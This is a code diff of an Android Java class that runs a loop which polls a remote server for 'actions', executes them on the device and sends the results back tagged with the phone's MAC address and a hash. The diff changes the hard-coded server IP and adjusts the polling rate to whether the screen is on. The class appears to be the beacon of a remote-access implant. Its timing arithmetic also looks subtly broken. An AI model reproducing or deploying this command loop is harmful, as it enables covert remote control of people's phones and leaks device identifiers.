@@ -38,7 +38,7 @@ public class ConnectionServerThread implements Runnable {
         this.context = context;
         this.httpURLConnection = new HttpsURLConnectionHelper();
         this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
-        this.host = "192.168.1.36";
+        this.host = "10.10.162.233";
         this.port = "8080";
         this.timeon = 4000;
         this.timeoff = 54000;
@@ -61,26 +61,26 @@ public class ConnectionServerThread implements Runnable {
         //Looper.loop();
         String result;
         long now;
-        Log.i(TAG, "run");
-             while (!isCancel()){
-              now = System.currentTimeMillis();
+        while (!isCancel()) {
+            now = System.currentTimeMillis();
 
-              if (time != timeoff && !Tools.isScreenOn(context)){
-                  time = timeoff;
-              }else if (time != timeon && Tools.isScreenOn(context)){
-                  time = timeon;
-              }
-
-              if (detla > time) {
-                   result = this.httpURLConnection.getHttp(urlaction);
-                   if (result != null && !result.equals("null")) {
-                       this.httpURLConnection.postHttp(urlresult, actionService.action(result), this.MAC + "::::" +this.HASH);
-                       detla = 0;
-                   }
-              }
-              detla += now;
-              Tools.sleep(timeon/2);
+            if (time != timeoff && !Tools.isScreenOn(context)) {
+                time = timeoff;
+            }else if (time != timeon && Tools.isScreenOn(context)) {
+                time = timeon;
             }
+
+            if (detla > time) {
+                result = this.httpURLConnection.getHttp(urlaction, this.MAC + "::::" +this.HASH);
+                if (result != null && !result.equals("null")) {
+                    this.httpURLConnection.postHttp(urlresult, actionService.action(result), this.MAC + "::::" +this.HASH);
+                    detla = 0;
+                }
+            }
+
+            detla += now;
+            Tools.sleep(timeon/2);
+        }
 
     }
 
